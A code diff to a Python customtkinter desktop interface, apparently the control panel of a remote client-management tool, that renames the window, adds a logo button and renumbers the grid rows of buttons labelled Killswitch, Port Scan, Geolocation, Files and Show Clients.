@@ -1,3 +1,4 @@
+from PIL import Image
 import customtkinter
 import tkinter
 import threading
@@ -33,7 +34,7 @@ class App(customtkinter.CTk):
     def __init__(self):
         super().__init__()
                
-        self.title("Cool app")
+        self.title("Nuntius")
         self.geometry("1000x500")
 
         # create 2x2 grid system
@@ -66,32 +67,39 @@ class App(customtkinter.CTk):
                                height=500)
         self.frame1.grid(row=0, column=0, sticky="w", padx=10)
         
-        # Buttons
+        # Buttons and the Logo
+        self.my_image = customtkinter.CTkImage(light_image=Image.open("Data//new.png"),
+                                  dark_image=Image.open("Data//new.png"),
+                                  size=(120, 120))
+
+        self.button = customtkinter.CTkButton(self.frame1, image=self.my_image,bg_color="black",hover_color="black",fg_color="black",text=None,)
+        self.button.grid(row=0, column=0, pady =10,padx =10,sticky="n")
+
         self.button = customtkinter.CTkButton(master=self.frame1, 
                                             text="Killswitch",
                                             bg_color="red", 
                                             fg_color="black",
                                             hover_color="red",
                                             command=self.killswitch)
-        self.button.grid(row=0, column=0, pady =10,sticky="n", padx=10)
+        self.button.grid(row=1, column=0, pady =10,sticky="n", padx=10)
       
         self.button = customtkinter.CTkButton(master=self.frame1, 
                                             command=self.startPortScan, 
                                             text="Port Scan")
-        self.button.grid(row=1, column=0, pady =10,sticky="n", padx=10)
+        self.button.grid(row=2, column=0, pady =10,sticky="n", padx=10)
 
         self.button = customtkinter.CTkButton(master=self.frame1, 
                                             command=self.openMapLevel,
                                             text="Geolocation")
-        self.button.grid(row=2, column=0, pady =10,sticky="n", padx=10)     
+        self.button.grid(row=3, column=0, pady =10,sticky="n", padx=10)     
 
         self.button = customtkinter.CTkButton(master=self.frame1, 
                                             command=self.showFiles,
                                             text="Files")
-        self.button.grid(row=3, column=0, pady =10, sticky="n", padx=10)
+        self.button.grid(row=4, column=0, pady =10, sticky="n", padx=10)
 
         self.button = customtkinter.CTkButton(master=self.frame1, command=self.startGathering, text="Show Clients")
-        self.button.grid(row=4,column=0,pady=10,sticky="n", padx=10)
+        self.button.grid(row=5,column=0,pady=10,sticky="n", padx=10)
         
         #! Center Frame: Main content/command line
         self.frame2 = customtkinter.CTkFrame(master=self,
